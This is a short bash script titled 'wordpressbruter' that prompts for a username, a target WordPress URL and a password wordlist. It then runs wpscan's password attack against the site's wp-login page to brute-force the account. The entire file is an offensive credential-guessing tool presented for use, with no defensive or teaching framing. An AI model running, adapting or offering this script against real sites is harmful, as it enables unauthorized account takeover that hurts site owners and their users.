#! /bin/bash
figlet wordpressbruter
echo "hacking a rise "
echo "mead by laughingman "
echo "make sure you have your wordlist handy" 
echo "Lets go"
echo Enter Username:
read Username
echo Enter Link:
read Link
echo Provide Directory of Wordlist for Passwords:
read wordlist

wpscan --url $Link -P $wordlist -U $Username --password-attack wp-login


